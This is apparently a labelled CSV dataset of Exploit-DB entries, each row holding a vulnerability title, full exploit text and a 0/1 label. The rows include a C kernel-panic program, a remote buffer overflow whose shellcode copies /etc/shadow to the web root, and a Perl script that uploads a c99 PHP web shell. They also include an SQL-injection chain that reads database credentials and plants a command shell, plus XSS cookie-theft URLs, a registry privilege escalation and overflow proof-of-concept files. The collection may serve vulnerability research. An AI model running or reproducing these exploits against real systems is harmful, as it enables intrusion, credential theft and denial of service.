7091,"Linux Kernel < 2.4.36.9/2.6.27.5 - Unix Sockets Local Kernel Panic (Denial of Service) #include <sys/socket.h> #include <sys/un.h> #include <unistd.h> #include <assert.h> #include <err.h> #include <stdlib.h>  static int own_child(int *us) {         int pid;         int s[2];         struct msghdr mh;         char crap[1024];         struct iovec iov;         struct cmsghdr *c;         int *fd;         int rc;          pid = fork();         if (pid == -1)                 err(1, ""fork()"");          if (pid) {               close(us[1]);                  return pid;         }          close(us[0]);          memset(&mh, 0, sizeof(mh));         iov.iov_base = ""a"";         iov.iov_len  = 1;          mh.msg_iov        = &iov;         mh.msg_iovlen     = 1;         mh.msg_control    = crap;         mh.msg_controllen = sizeof(crap);          c = CMSG_FIRSTHDR(&mh);         assert(c);          c->cmsg_level = SOL_SOCKET;         c->cmsg_type  = SCM_RIGHTS;          fd = (int*) CMSG_DATA(c);         assert(fd);          c->cmsg_len = CMSG_LEN(sizeof(int));         mh.msg_controllen = c->cmsg_len;          while (1) {                 if (socketpair(PF_UNIX, SOCK_STREAM, 0, s) == -1)                         err(1, ""socketpair()"");                  *fd = s[0];                  rc = sendmsg(us[1], &mh, 0);                 if (rc == -1)                         err(1, ""sendmsg()"");                  if (rc != iov.iov_len)                         errx(1, ""sent short"");                  close(s[0]);                 close(us[1]);                 us[1] = s[1];         } }  static void own(void) {                static int pid;         static int us[2];         char crap[1024];         char morte[1024];         struct cmsghdr *c;         int rc;         struct msghdr mh;         struct iovec iov;         int *fds;          if (!pid) {                 if (socketpair(PF_UNIX, SOCK_STREAM, 0, us) == -1)                         err(1, ""socketpair()"");                 pid = own_child(us);         }          iov.iov_base = morte;         iov.iov_len  = sizeof(morte);          memset(&mh, 0, sizeof(mh));         mh.msg_iov        = &iov;         mh.msg_iovlen     = 1;         mh.msg_control    = crap;         mh.msg_controllen = sizeof(crap);          rc = recvmsg(us[0], &mh, 0);         if (rc == -1)                 err(1, ""recvmsg()"");          if (rc == 0)                 errx(1, ""EOF"");          c = CMSG_FIRSTHDR(&mh);         assert(c);         assert(c->cmsg_type == SCM_RIGHTS);          fds = (int*) CMSG_DATA(c);         assert(fds);          close(us[0]);         us[0] = *fds; }  int main(int argc, char *argv[]) { 	own(); 	exit(0); }  // milw0rm.com [2008-11-11]",Linux Kernel,1
27502,Connect Daily 3.2.8/3.2.9 - 'ViewDay.html' Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/17287/info  Connect Daily is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.   An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  http://www.example.com/ViewDay.html?start=2453810&&integral=0&style_sheetuserStyle.css&dropdown=1&show_stop=0&show_resources0&calendar_id=[code] http://www.example.com/ViewDay.html?start=2453810&&integral=0&style_sheet=[code] http://www.example.com/ViewDay.html?start=[code],Connect Daily,1
34275,"Pro Chat Rooms 8.2.0 - Multiple Vulnerabilities # Exploit Title: Pro Chat Rooms v8.2.0 - Multiple Vulnerabilities # Google Dork: intitle:""Powered by Pro Chat Rooms"" # Date: 5 August 2014 # Exploit Author: Mike Manzotti @ Dionach Ltd # Vendor Homepage: http://prochatrooms.com # Software Link: http://prochatrooms.com/software.php # Version: v8.2.0 # Tested on: Debian (Apache+MySQL)  1) Stored XSS ===========  Text Chat Room Software of ProoChatRooms is vulnerable to Stored XSS. After registered an account, an attacker can upload a profile picture containing Javascript code as shown below:  POST: http://<WEBSITE>/prochatrooms/profiles/index.php?id=1<http://%3cWEBSITE%3e/prochatrooms/profiles/index.php?id=1> Content-Disposition: form-data; name=""uploadedfile""; filename=""nopic333.jpg"" Content-Type: image/jpeg  <script>alert(document.cookie)</script>  By inspecting the response, the web application returns a 32 digits value in the HTML tag ""imgID"" as shown below:  Response: <input type=""hidden"" name=""imgID"" value=""798ae9b06cd900b95ed5a60e02419d4b"">  The picture is uploaded under the directory ""/profiles/uploads"" and is accessible by force browsing to the 32 digits value as shown below:  http://<WEBSITE>/prochatrooms/profiles/uploads/798ae9b06cd900b95ed5a60e02419d4b<http://%3cWEBSITE%3e/prochatrooms/profiles/uploads/798ae9b06cd900b95ed5a60e02419d4b>   2) Reflected XSS =============  Text Chat Room Software of ProoChatRooms is vulnerable to Reflected XSS. The parameter ""edit"" is not encoded:  http://<WEBSITE>/prochatrooms/profiles/index.php?id=1&edit=""><script>alert(document.cookie)</script><http://%3cWEBSITE%3e/prochatrooms/profiles/index.php?id=1&edit=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e>   3) SQL Injection =============  Text Chat Room Software of ProoChatRooms is vulnerable to SQL injections. Across the all source code of web application, parameterized queries are used to query the database. However, a lack of data sanitization of three parameters leaves the web application vulnerable to SQLi. The vulnerable parameters are located as shown below:  prochatrooms_v8.2.0/includes/functions.php: ~2437 $params = array( 'password' => md5($password), 'email' => makeSafe($email), 'id' => $id ); $query = ""UPDATE prochatrooms_users               SET email = '"".$email.""',                     password='"".md5($password).""'               WHERE id = '"".$id.""'               "";  prochatrooms_v8.2.0/includes/functions.php: ~2449 $query = ""UPDATE prochatrooms_users               SET email = '"".$email.""'               WHERE id = '"".$id.""'               "";  prochatrooms_v8.2.0/includes/functions.php: ~3110 $query = ""UPDATE prochatrooms_users               SET active = '"".$offlineTime.""', online = '0'               WHERE username = '"".makeSafe($toname).""'               "";  Note that the ""makeSafe"" function is defined as shown below and will protect against XSS attacks only:  prochatrooms_v8.2.0/includes/functions.php: ~125 function makeSafe($data) {       $data = htmlspecialchars($data);        return $data; }   After registering an account, an attacker can exploit the SQL injection by editing the field email as shown below which will retrieve the MD5 hashed password of the administrator:  POST  http://<WEBSITE>/prochatrooms/profiles/index.php?id=1<http://%3cWEBSITE%3e/prochatrooms/profiles/index.php?id=1> Content-Disposition: form-data; name=""profileEmail""  mm@1dn.eu', email=(select adminLogin from prochatrooms_config) where id ='1';#   The following SQL injection will retrieve the SQL connection string, which probably has clear-text database credentials.  POST http://<WEBSITE>/prochatrooms/profiles/index.php?id=1<http://%3cWEBSITE%3e/prochatrooms/profiles/index.php?id=1> Content-Disposition: form-data; name=""profileEmail""  mm@1dn.eu', email=(select load_file('/var/www/prochatrooms/includes/db.php')) where id ='1';#     4) Arbitrary File Upload ==================  It is possible to combine the Stored XSS and SQL injection vulnerabilities to upload a web shell on the server.  The following request will upload a PHP web shell and the web application will return a 32 digit value.  POST:  http://<WEBSITE>/prochatrooms/profiles/index.php?id=1<http://%3cWEBSITE%3e/prochatrooms/profiles/index.php?id=1> Content-Disposition: form-data; name=""uploadedfile""; filename=""m.jpg"" Content-Type: application/octet-stream  <?php system($_GET[cmd]);?>  Response: <input type=""hidden"" name=""imgID"" value=""82d0635538da4eac42da25f8f95f8c45"">  Since the uploaded web shell is without extension it will not be executed:  http://<WEBSITE>/prochatrooms/profiles/uploads/82d0635538da4eac42da25f8f95f8c45<http://%3cWEBSITE%3e/prochatrooms/profiles/uploads/82d0635538da4eac42da25f8f95f8c45> <?php system($_GET[cmd]);?>  Image: [cid:image005.png@01CFB099.8E117F70]  However, exploiting the SQL injection it is possible to rename the file by appending a .php extension  POST  http://<WEBSITE>/prochatrooms/profiles/index.php?id=1<http://%3cWEBSITE%3e/prochatrooms/profiles/index.php?id=1> Content-Disposition: form-data; name=""profileEmail""  mm@1dn.eu' where id ='1'; SELECT load_file('/var/www/prochatrooms/profiles/uploads/82d0635538da4eac42da25f8f95f8c45') INTO OUTFILE '/var/www/prochatrooms/profiles/uploads/s.php';#  Web shell: http://<WEBSITE>/prochatrooms/profiles/uploads/s.php?cmd=id<http://%3cWEBSITE%3e/prochatrooms/profiles/uploads/s.php?cmd=id> uid=33(www-data) gid=33(www-data) groups=33(www-data)  Image: [cid:image006.png@01CFB099.8E117F70]   Timeline ======== 19/07/2014: Vendor informed via email 04/08/2014: Vendor informed via email 05/08/2014: Public Disclosure  Kind regards, Mike  ______________________________________________________________________  Disclaimer: This e-mail and any attachments are confidential.  It may contain privileged information and is intended for the named addressee(s) only. It must not be distributed without Dionach Ltd consent. If you are not the intended recipient, please notify the sender immediately and destroy this e-mail.   Any unauthorised copying, disclosure or distribution of the material in this e-mail is strictly forbidden. Unless expressly stated, opinions in this e-mail are those of the individual sender, and not of Dionach Ltd.  Dionach Ltd, Greenford House, London Road, Wheatley, Oxford OX33 1JH Company Registration No. 03908168, VAT No. GB750661242  ______________________________________________________________________","Pro Chat Rooms""",1
32706,"Notepad++ DSpellCheck 1.2.12.0 - Denial of Service # Exploit Title: Notepad++ - DSpellCheck v1.2.12.0 plugin[DOS] # Exploit Author: sajith # Vendor Homepage: http://notepad-plus-plus.org/ # Software Link: http://notepad-plus-plus.org/download/ # vulnerable plugin Version: DSpellCheck v 1.2.12.0 # Tested in: Windows XP SP3 EN,Notepad ++ 6.5.4   POC:   1)install notepadd ++  2)open up plugins tab and select Dspellcheck and click on settings  3)In ""hunspell dictionaries path"" field enter large character say 80000 A's and click on ""apply""   ########################################################## (cf8.4f8): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. eax=00690044 ebx=00000000 ecx=00000294 edx=01f56070 esi=01f56060 edi=00000000 eip=7c919fca esp=01d0ed74 ebp=01d0ede8 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010246 ntdll!RtlpWaitForCriticalSection+0x5b: 7c919fca ff4010 inc dword ptr [eax+10h] ds:0023:00690054=bc5d0050  ####################################################  FAULTING_IP: ntdll!RtlpWaitForCriticalSection+5b 7c919fca ff4010 inc dword ptr [eax+10h]  EXCEPTION_RECORD: ffffffff -- (.exr 0xffffffffffffffff) ExceptionAddress: 7c919fca (ntdll!RtlpWaitForCriticalSection+0x0000005b) ExceptionCode: c0000005 (Access violation) ExceptionFlags: 00000000 NumberParameters: 2 Parameter[0]: 00000001 Parameter[1]: 00690054 Attempt to write to address 00690054  FAULTING_THREAD: 000004f8  PROCESS_NAME: notepad++.exe .  FAULTING_MODULE: 7c900000 ntdll  DEBUG_FLR_IMAGE_TIMESTAMP: 52c4419f  ERROR_CODE: (NTSTATUS) 0xc0000005 - The instruction at ""0x%08lx"" referenced memory at ""0x%08lx"". The memory could not be ""%s"".  EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - The instruction at ""0x%08lx"" referenced memory at ""0x%08lx"". The memory could not be ""%s"".  EXCEPTION_PARAMETER1: 00000001  EXCEPTION_PARAMETER2: 00690054  WRITE_ADDRESS: 00690054  FOLLOWUP_IP: DSpellCheck!setInfo+577f5 012f4cb5 59 pop ecx  CRITICAL_SECTION: 00f56060 -- (!cs -s 00f56060)  BUGCHECK_STR: APPLICATION_FAULT_STRING_DEREFERENCE_INVALID_POINTER_WRITE_WRONG_SYMBOLS  PRIMARY_PROBLEM_CLASS: STRING_DEREFERENCE  DEFAULT_BUCKET_ID: STRING_DEREFERENCE  LAST_CONTROL_TRANSFER: from 7c901046 to 7c919fca  STACK_TEXT: WARNING: Stack unwind information not available. Following frames may be wrong. 01d0ede8 7c901046 00f56060 012feb19 01f56060 ntdll!RtlpWaitForCriticalSection+0x5b 01d0ee00 012f4cb5 00000013 012f8787 00000003 ntdll!RtlEnterCriticalSection+0x46 01d0ee48 012f15f0 908eab95 01654af8 00000000 DSpellCheck!setInfo+0x577f5 01d0ee7c 012f166b 01f54058 0130e360 00000040 DSpellCheck!setInfo+0x54130 01d0ee8c 012aecaa 01f54058 0130e360 01f56056 DSpellCheck!setInfo+0x541ab 01d0ee90 01f54058 0130e360 01f56056 00000000 DSpellCheck!setInfo+0x117ea 01d0ee94 0130e360 01f56056 00000000 016549a8 0x1f54058 01d0ee98 01f56056 00000000 016549a8 00000000 DSpellCheck!setInfo+0x70ea0 01d0ee9c 00000000 016549a8 00000000 00000000 0x1f56056   SYMBOL_STACK_INDEX: 2  SYMBOL_NAME: DSpellCheck!setInfo+577f5  FOLLOWUP_NAME: MachineOwner  MODULE_NAME: DSpellCheck  IMAGE_NAME: DSpellCheck.dll  STACK_COMMAND: ~4s ; kb  BUCKET_ID: WRONG_SYMBOLS  FAILURE_BUCKET_ID: STRING_DEREFERENCE_c0000005_DSpellCheck.dll!setInfo  Followup: MachineOwner  ####################################################",Notepad++ DSpellCheck,1
6674,"FOSS Gallery Public 1.0 - Arbitrary File Upload # FOSS Gallery Public <= 1.0 Arbitrary Upload / Information c99 Expoit # url: http://downloads.sourceforge.net/fossgallery/ # # Author: JosS # mail: sys-project[at]hotmail[dot]com # site: http://spanish-hackers.com # team: Spanish Hackers Team - [SHT] # # This was written for educational purpose. Use it at your own risk. # Author will be not responsible for any damage. # # OUTPUT: # # Exploited sucessfully. # # [+] Info: #    Linux h4x0rz 2.6.18-6-686 #1 SMP Mon Aug 18 08:42:39 UTC 2008 i686 #    uid=33(www-data) gid=33(www-data) groups=33(www-data) #    Safe Mode: OFF (not secure) # # joss@h4x0rz:~/Desktop$   use LWP::UserAgent; use HTTP::Request::Common; use HTTP::Headers; use LWP::UserAgent; use HTTP::Request; use LWP::Simple;  sub lw {  my $SO = $^O; my $linux = """"; if (index(lc($SO),""win"")!=-1){ 		   $linux=""0""; 	    }else{ 		    $linux=""1""; 	    } 		if($linux){ system(""clear""); } else{ system(""cls""); } }  my ($host, $file) = @ARGV ;  if (!$ARGV[0]) {  &lw; print ""\n[x] FOSS Gallery Public <= 1.0 Arbitrary Upload / Information c99 Expoit\n""; print ""[x] written by JosS - sys-project[at]hotmail.com\n""; print ""[x] http://www.spanish-hackers.com/\n\n""; print ""Usage: $0 [host] [file] \n""; print ""if doesn't exist the file: file default is phpshell C99\n\n""; exit; } if (!$ARGV[1]) { $file=""c99.php""; }  &lw;  $host = 'http://'.$host if ($host !~ /^http:/); $host .= ""/"" if ($host !~ /\/\$/);  my $ua = LWP::UserAgent->new(); $ua->timeout(12); my $request = HTTP::Request->new(); my $response; my $header; my $url = $host.""processFiles.php"";  $response = $ua->request(POST $url, Content_Type => 'form-data', 					Content => [ uploadNeed => ""1"", uploadFile0 => [$file]]); $content = $response->content;  if ($content =~ /uploaded sucessful/) { print ""\nExploited sucessfully.\n""; } else { print ""\nExploit failed\n""; exit;}  my $c99=""c99.php"";  chomp ($c99);  if ($file =~ /c99.php/) {  $comando=""?act=cmd&d=/&cmd=/&cmd_txt=1&submit=Execute"";  print ""\n"";   my $final = $host.$c99.$comando;  my $ua = LWP::UserAgent->new;  my $req = HTTP::Request->new(GET => $final);  $ua->timeout(10);  $doc = $ua->request($req)->as_string;    $kernel = $1 if ( $doc =~ m/-a:&nbsp; (.*?)\<\/b>/mosix); $id = $1 if ( $doc =~ m/<b>uid (.*?)\<\/b>/mosix);  $safe = $1 if ( $doc =~ m/color=green> (.*?)\<\/font>/mosix);    print ""[+] Info:\n"";  print ""    $kernel\n""; print ""    uid$id\n"";  print ""    Safe Mode: $safe\n"";  print ""\n"";    }  __EOF__  # milw0rm.com [2008-10-05]",FOSS Gallery Public,0
33596,KnowGate hipergate 4.0.12 - Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/38094/info  KnowGate hipergate is prone to multiple cross-site scripting vulnerabilities because the application fails to properly sanitize user-supplied input.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  KnowGate hipergate 4.0.12 is vulnerable; other versions may also be affected.   http://www.example.com:8080/hipergate/common/errmsg.jsp?title=%3Cscript%3Ealert%28%22titleXSS%22%29; %3C/script%3E&desc=%3Cscript%3Ealert%28%22descXSS%22%29;%3C/script%3E&resume=_back,KnowGate hipergate,1
20780,"CrossWind CyberScheduler 2.1 - websyncd Remote Buffer Overflow // source: https://www.securityfocus.com/bid/2628/info   CrossWind CyberScheduler is a scheduling and calendaring package. It consists of two distinct parts for - a set of cgi scripts on a web server and a set of daemons (or services) on a database server. Both parts are available for Windows NT, Linux and a range of UNIX platforms including Solaris.  One of the CyberScheduler daemons 'websyncd' (websyncd.exe on Windows NT) contains an exploitable buffer overflow in its timezone string parser. A timezone string is passed to websyncd by the websync.cgi cgi program (websync.exe on NT) through the tzs form variable.  Because websyncd runs as root, a stack overflow allows arbitrary code execution as root. The overflow occurs before any logon credentials are verified by websync.cgi, so unprivileged remote users can exploit this vulnerability.   /* PRIVATE -- DO NOT DISTRIBUTE!!   x-cybershed.c    TimeZONE buffer overflow on cgi script rendering complete control of the stack.    Enrique A. Sanchez Montellano   enrique.sanchez@defcom.com */  #include <stdio.h> #include <stdlib.h> #include <unistd.h> #include <string.h> #include <netdb.h> #include <sys/types.h> #include <sys/socket.h> #include <sys/wait.h> #include <sys/stat.h> #include <sys/time.h> #include <netinet/in.h> #include <netdb.h> #include <fcntl.h> #include <time.h> #include <wait.h> #include <errno.h>  #define OFFSET       0 #define ALIGN        0 #define BUFFER       264  /* Definicion de colores */  #define VERDE   ""\E[32m"" #define BRILLOSO   ""\E[1m"" #define NORMAL  ""\E[m"" #define ROJO  ""\E[31m"" #define CELESTE ""\E[36m"" #define AZUL ""\E[34m"" #define AMARILLO ""\E[33m"" #define MORADO ""\E[35m""  //passive port 0x8000 shell (written by agent0nd) //static char Hellcode[]= //""\xeb\x4b\x5f\x87\xfe\x29\xc0\x29\xdb\x40\x89\x46\x04\x40\x89\x06\xb0\x06\x89"" //""\x46\x08\xb0\x66\x43\x89\xf1\xcd\x80\x89\x06\xb0\x02\x66\x89\x46\x0c\xb0\x80"" //""\x66\x89\x46\x0e\x8d\x46\x0c\x89\x46\x04\x29\xc0\x89\x46\x10\xb0\x10\x89\x46"" //""\x08\xb0\x66\x43\xcd\x80\x29\xc0\x40\x89\x46\x04\xb3\x04\xb0\x66\xcd\x80\xeb"" //""\x02\xeb\x4c\x29\xc0\x89\x46\x04\x89\x46\x08\xb0\x66\x43\xcd\x80\x88\xc3\x29"" //""\xc9\xb0\x3f\xcd\x80\xb0\x3f\x41\xcd\x80\xb0\x3f\x41\xcd\x80\xb8\x2e\x62\x69"" //""\x6e\x40\x89\x06\xb8\x2e\x73\x68\x21\x40\x89\x46\x04\x29\xc0\x88\x46\x07\x89"" //""\x76\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x29\xc0"" //""\x40\xcd\x80\xe8\x62\xff\xff\xff"";  /* cp /etc/shadow /var/lib/httpd/htdocs */ static char Hellcode[]= ""\xeb\x3a\x5f\x31\xc0\x89\xfa\x89\x57\x64\x80\xc2\x36\x89\x57\x68\x80\xc2\x33\x80\xea\x30\x89\x57\x6c\x89\x47\x70\x88\x47\x25\x88\x4 7\x38\x88\x47\x62\xb0\x73\x2c\x53\x88\x47\x40\x88\x47\x4c\xb0\x6c\x2c\x61\x89\xfb\x8d\x4f\x64\x31\xd2\xcd\x80\xe8\xc1\xff\xff\xff\x2 f\x73\x62\x69\x6e\x2f\x2e\x2e\x2f\x73\x62\x69\x6e\x2f\x2e\x2e\x2f\x62\x69\x6e\x2f\x2e\x2e\x2f\x62\x69\x6e\x2f\x2e\x2e\x2f\x62\x69\x6 e\x2f\x73\x68XAGENT.OND.DEFCOM\x2d\x63\x58\x2f\x62\x69\x6e\x2f\x63\x70\x58\x2f\x65\x74\x63\x2f\x73\x68\x61\x64\x6f\x77\x58\x2f\x76\x 61\x72\x2f\x6c\x69\x62\x2f\x68\x74\x74\x70\x64\x2f\x68\x74\x64\x6f\x63\x73"";  unsigned long resolver (char *serv) {   struct sockaddr_in sinn;   struct hostent *hent;    hent = gethostbyname (serv);   bzero ((char *) &sinn, sizeof (sinn));   memcpy ((char *) &sinn.sin_addr, hent->h_addr, hent->h_length);   return sinn.sin_addr.s_addr;  }  unsigned long get_sp(void) {   __asm__(""movl %esp, %eax""); }  void usage(char *name) {   printf(""Usage:\n"");   printf(""%s <victim> <offset> <align> <buffer> \n\n"", name); }  int connex(u_long victim) {   int sockfd;   struct sockaddr_in hostaddr;    if((sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {    perror(""connex"");    exit(-1);   }    hostaddr.sin_port = htons(80);   hostaddr.sin_addr.s_addr = victim;   hostaddr.sin_family = AF_INET;    if((connect(sockfd, (struct sockaddr *) &hostaddr, sizeof(hostaddr))) < 0 ) {    perror(""connex"");    exit(-1);   }     return sockfd; }  int ataque(int victim, char *command) {   int sockfd, retval, i;   char tmp[256];   fd_set rfds;   struct timeval timer;   char part1[1024] = ""/cgi-bin/websync.cgi?ed=&Es=7x1x101&un=Defcom&hn=lab&rpt=/cybersched/En_US/WebResources&cbn=/cgi-bin/websync.cgi&dow=sun&dmy=Off&tf h=Off&lan=En_US&ix=0&amd=2&epw=WXxiAkS&mrd=-1&mrc=0&mrb=0&bnv=9&ds=7x1x101&tzs="";   char fancy[] = ""Host: 127.0.0.1\nConnection: Keep-Alive\nUser-Agent: Defcom Labs @ Spain version 0.1\nContent-type: aplication/x-www-form-urlencoded\n"";    sockfd = connex(victim);    FD_ZERO(&rfds);   FD_SET(sockfd, &rfds);   timer.tv_sec = 5;   timer.tv_usec = 0;    retval = select(sockfd + 1, NULL, &rfds, NULL, &timer);    if(retval) {    printf(""%s[ + ] Atacking the server ... \n%s"", VERDE, NORMAL);    write(sockfd, ""GET "", strlen(""GET ""));    write(sockfd, part1, strlen(part1));    write(sockfd, command, strlen(command));    write(sockfd, ""\n"", strlen(""\n""));    // Fancy stuff ... LoL!    write(sockfd, fancy, strlen(fancy));    write(sockfd, ""\n\n"", strlen(""\n\n""));    for(i = 0; i < 256; i++) {      tmp[i] = '\0';    }    read(sockfd, tmp, sizeof(tmp));   }   else {    printf(""%sTime out!!!!!\n%s"", ROJO, NORMAL);    exit(-1);   }  }  int main(int argc, char **argv) {   int offset = OFFSET;   int align = ALIGN;   int buffer = BUFFER;   struct hostent *hent;   char *command;   unsigned long addr;   int i, victim;    if(argc < 2) {    usage(argv[0]);    exit(0);   }    if(argc > 2) offset = atoi(argv[2]);   if(argc > 3) align = atoi(argv[3]);   if(argc > 4) buffer = atoi(argv[4]);    if((hent = gethostbyname(argv[1])) == NULL) {    perror(""x-cybersched"");    exit(1);   }    printf(""%sX-Cybersched\n"", AZUL);   printf(""------------------------------------\n"");   printf(""Remote exploit .... by\n"");   printf(""Enrique Sanchez (enrique.sanchez@defcom.com)\n%s"", NORMAL);  #ifdef DEBUG   printf(""%s[ + DEBUG + ] Buffer is %d\n%s"", AMARILLO,  buffer, NORMAL);   printf(""%s[ + DEBUG + ] The size of the shellcode is %d\n%s"", AMARILLO, strlen(Hellcode), NORMAL); #endif    addr = 0xbfffffff - offset;   command = (char *)malloc(buffer);    printf(""%s[ + ] Using addres: 0x%x\n%s"", VERDE, addr, NORMAL);  #ifdef DEBUG   printf(""%s[ + DEBUG + ] Command right now is: %s\n\n%s"", AMARILLO, command, NORMAL); #endif    printf(""%s[ + ] Filling buffer for exploitation ... \n%s"", VERDE, NORMAL);    for(i = 0; i < buffer; i += 4) {    *(long *)&command[i] = 0x90909090;   }   *(long *)&command[buffer - 4] = addr;  #ifdef DEBUG   printf(""%s[ + DEBUG + ] Command right now is: %s\n\n%s"", AMARILLO, command, NORMAL); #endif    memcpy(command + buffer - strlen(Hellcode) - 4, Hellcode, strlen(Hellcode));  #ifdef DEBUG   printf(""%s[ + DEBUG + ] Command right now is: %s\n\n%s"", AMARILLO, command, NORMAL); #endif    ataque(resolver(argv[1]), command);    return 0; }",CrossWind CyberScheduler,1
26273,"vBulletin 1.0.1 lite/2.x/3.0 - 'joinrequests.php?request' SQL Injection source: https://www.securityfocus.com/bid/14872/info  vBulletin is prone to multiple SQL injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input before using it in SQL queries.  Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation.  > /joinrequests.php: POST: <do=processjoinrequests&usergroupid=22&request[[SQL-Injection]]=0>",vBulletin,1
19167,"Ipswitch IMail 5.0 / Ipswitch WS_FTP Server 1.0.1/1.0.2 - Local Privilege Escalation source: https://www.securityfocus.com/bid/218/info  Non-administrative Imail and WS_FTP Server users may elevate their privileges to administrator for these applications by modifying a specific registry value. Once a person has obtained administrative privileges, they may use the application interface (locally) to read email, create accounts, delete accounts, etc.   Access the following registry key ""HKEY_LOCAL_MACHINE\SOFTWARE\Ipswitch\IMail\Domains\Machine_name\Users\Username"" Modify the Flag value to read ""1920"". 1920 gives the user account administrator permissions to IMail and WS_FTP Server.",Ipswitch WS_FTP Server,1
13902,"Ananda Image Gallery - SQL Injection Exploit Title:Ananda Image Gallery SQL Vulnerable Vendor url:http://www.softwebsnepal.com/ Version:n/a Price:159$ Author: L0rd CrusAd3r aka VSN [crusader_hmg@yahoo.com] Published: 2010-06-17 Greetz to:Sid3^effects, MaYur, M4n0j, Dark Blue, S1ayer,d3c0d3r,KD and to all ICW members. Spl Greetz to:inj3ct0r.com Team, Andhra hackers.com  ~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~  Description:  Unlimited photo upload: This software helps you to upload unlimited photo to you website. click here for Thumbnail  Auto Thumbnail and Auto photo aspect ratio creater: This software automatically create thumbnail of uploaded photo and also mange aspect ratio of the uploaded photo with the thumbnail photo so there will be no photo tear and also you can manage the compression rate of uploaded photo.  Admin Panel: This software comes with admin panel form where you can upload photo, create category and subcategory.   Categories and subcategories: Admin can create unlimited category and subcategory, it is very easy to create any number of hierarchical categories. click here for Thumbnail   Profile Setup : Admin can change profile form control panel, which will appear in contact us page. click here for Thumbnail  Password Setup : Admin can change password form their control panel. click here for Thumbnail  Easy Setup: Setting up this software is very easy. Just unzip the files and upload it to your server. then just set one file and you are ready to go.  ~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~  Vulnerability:  *SQLi Vulnerability  DEMO URL :  http://[site]/gallery/default.asp?id=[sqli]   # 0day n0 m0re # # L0rd CrusAd3r #   --  With R3gards, L0rd CrusAd3r",Ananda Image Gallery,1
36928,"Macro Toolworks 7.5 - Local Buffer Overflow source: https://www.securityfocus.com/bid/52351/info  Macro Toolworks is prone to a local buffer-overflow vulnerability because it fails to perform adequate boundary checks on user-supplied data.  Local attackers can exploit this issue to run arbitrary code with elevated privileges. Failed exploit attempts can result in a denial-of-service condition.  Macro Toolworks 7.5.0 is vulnerable; other versions may also be affected.   #!/usr/bin/python   # Exploit Title: Pitrinec Software Macro Toolworks Free/Standard/Pro v7.5.0 Local Buffer Overflow # Version:       7.5.0 # Date:          2012-03-04 # Author:        Julien Ahrens # Homepage:      http://www.inshell.net # Software Link: http://www.macrotoolworks.com # Tested on:     Windows XP SP3 Professional German / Windows 7 SP1 Home Premium German # Notes:         Overflow occurs in _prog.exe, vulnerable are all Pitrinec applications on the same way. # Howto:         Copy options.ini to App-Dir --> Launch  # 646D36: The instruction at 0x646D36 referenced memory at 0x42424242. The memory could not be read -> 42424242  (exc.code c0000005, tid 3128)  # Registers: # EAX 0120EA00 Stack[000004C8]:0120EA00 # EBX FFFFFFFF  # ECX 42424242  # EDX 00000002  # ESI 007F6348 _prog.exe:007F6348 # EDI 007F6348 _prog.exe:007F6348 # EBP 0120EA0C Stack[000004C8]:0120EA0C # ESP 0120E9E8 Stack[000004C8]:0120E9E8 # EIP 00646D36 _prog.exe:00646D36 # EFL 00200206  # Stack: # 0120E9E0  0012DF3C # 0120E9E4  00000000 # 0120E9E8  0205A5A0  debug045:0205A5A0 # 0120E9EC  1B879EF8 # 0120E9F0  007F6348  _prog.exe:007F6348 # 0120E9F4  007F6348  _prog.exe:007F6348  # Crash: # _prog.exe:00646D36 ; --------------------------------------------------------------------------- # _prog.exe:00646D36 mov     eax, [ecx] # _prog.exe:00646D38 call    dword ptr [eax+0Ch] # _prog.exe:00646D3B call    near ptr unk_6750D0 # _prog.exe:00646D40 retn    4 # _prog.exe:00646D40 ; ---------------------------------------------------------------------------  # Dump: # 007F6380  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA # 007F6390  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA # 007F63A0  42 42 42 42 43 43 43 43  43 43 43 43 43 43 43 43  BBBBCCCCCCCCCCCC # 007F63B0  43 43 43 43 43 43 43 43  43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC # 007F63C0  43 43 43 43 43 43 43 43  43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC  file=""options.ini""  junk1=""\x41"" * 744 boom=""\x42\x42\x42\x42"" junk2=""\x43"" * 100  poc=""[last]\n"" poc=poc + ""file="" + junk1 + boom + junk2   try:     print ""[*] Creating exploit file...\n""     writeFile = open (file, ""w"")     writeFile.write( poc )     writeFile.close()     print ""[*] File successfully created!"" except:     print ""[!] Error while creating file!""",Macro Toolworks FreeStandardPro,1
